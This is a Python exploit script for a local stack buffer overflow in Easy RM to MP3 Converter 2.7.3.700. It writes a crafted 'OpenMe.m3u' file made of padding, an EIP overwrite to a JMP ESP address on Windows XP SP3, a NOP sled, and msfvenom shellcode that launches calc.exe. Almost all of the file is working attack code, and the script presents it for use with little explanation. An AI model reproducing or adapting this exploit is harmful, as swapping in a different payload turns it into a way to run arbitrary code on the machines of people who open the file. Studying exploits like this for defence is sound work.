#!/usr/share/python

import struct
import time
import socket

def BufferOverflow():
	
	#------------------------------------------------------------------------------#
	# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0A" -f python -v payload #
	#------------------------------------------------------------------------------#

	shellcode =  ""
	shellcode += "\xdd\xc6\xd9\x74\x24\xf4\x5b\xbf\xd5\xc2\x64\xc2"
	shellcode += "\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x7b\x14\x03\x7b"
	shellcode += "\xc1\x20\x91\x3e\x01\x26\x5a\xbf\xd1\x47\xd2\x5a"
	shellcode += "\xe0\x47\x80\x2f\x52\x78\xc2\x62\x5e\xf3\x86\x96"
	shellcode += "\xd5\x71\x0f\x98\x5e\x3f\x69\x97\x5f\x6c\x49\xb6"
	shellcode += "\xe3\x6f\x9e\x18\xda\xbf\xd3\x59\x1b\xdd\x1e\x0b"
	shellcode += "\xf4\xa9\x8d\xbc\x71\xe7\x0d\x36\xc9\xe9\x15\xab"
	shellcode += "\x99\x08\x37\x7a\x92\x52\x97\x7c\x77\xef\x9e\x66"
	shellcode += "\x94\xca\x69\x1c\x6e\xa0\x6b\xf4\xbf\x49\xc7\x39"
	shellcode += "\x70\xb8\x19\x7d\xb6\x23\x6c\x77\xc5\xde\x77\x4c"
	shellcode += "\xb4\x04\xfd\x57\x1e\xce\xa5\xb3\x9f\x03\x33\x37"
	shellcode += "\x93\xe8\x37\x1f\xb7\xef\x94\x2b\xc3\x64\x1b\xfc"
	shellcode += "\x42\x3e\x38\xd8\x0f\xe4\x21\x79\xf5\x4b\x5d\x99"
	shellcode += "\x56\x33\xfb\xd1\x7a\x20\x76\xb8\x10\xb7\x04\xc6"
	shellcode += "\x56\xb7\x16\xc9\xc6\xd0\x27\x42\x89\xa7\xb7\x81"
	shellcode += "\xee\x58\xf2\x88\x46\xf1\x5b\x59\xdb\x9c\x5b\xb7"
	shellcode += "\x1f\x99\xdf\x32\xdf\x5e\xff\x36\xda\x1b\x47\xaa"
	shellcode += "\x96\x34\x22\xcc\x05\x34\x67\xaf\xc8\xa6\xeb\x1e"
	shellcode += "\x6f\x4f\x89\x5e"
	
	#----------------------------#
	#           Payload          #
	#----------------------------#
	# buffer = AAA padding       # |---------------------------------------------------------+
	# buffer = EIP overwrite     # |--------| WinXP SP3 Pro : "\xFF\xE4" | [USER32.dll] |----|-+
	# buffer = NOP sled          # |---------------------------------------------------------|-|-+
	# buffer = Shellcode         # |---------------------------------------------------------|-|-|-+
	# buffer = BBB padding       # |---------------------------------------------------------|-|-|-|-+
	#----------------------------#                                                           | | | | |
	#                                                                                        | | | | |
	buffer  = "A" * 26065                              # <-----------------------------------+ | | | |
	buffer += struct.pack('<L', 0x7e47bcaf)            # <-------------------------------------+ | | |
	buffer += "\x90" * 40                              # <---------------------------------------+ | |
	buffer += shellcode                                # <-----------------------------------------+ |
	buffer += "B" * (30000-26065-4-40-len(shellcode))  # <-------------------------------------------+
	 
	try:
		f=open("OpenMe.m3u","w")
		print "[+] Creating %s bytes evil payload.." %len(buffer)
		time.sleep(1)
		f.write(buffer)
		f.close()
		print "[+] File created. Load that shit up!"
	except:
		print "File cannot be created"
	    
def main():
	print (
	'''
	+-+-+-+-+ +-+-+ +-+-+ +-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+
	|E|a|s|y| |R|M| |t|o| |M|P|3| |C|o|n|v|e|r|t|e|r| |v|2|.|7|.|3|.|7|0|0|
	+-+-+-+-+ +-+-+ +-+-+ +-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+
			+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
			|L|o|c|a|l| |B|u|f|f|e|r| |O|v|e|r|f|l|o|w|
			+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	'''
    )
	BufferOverflow()
		
if __name__ == '__main__':
	main()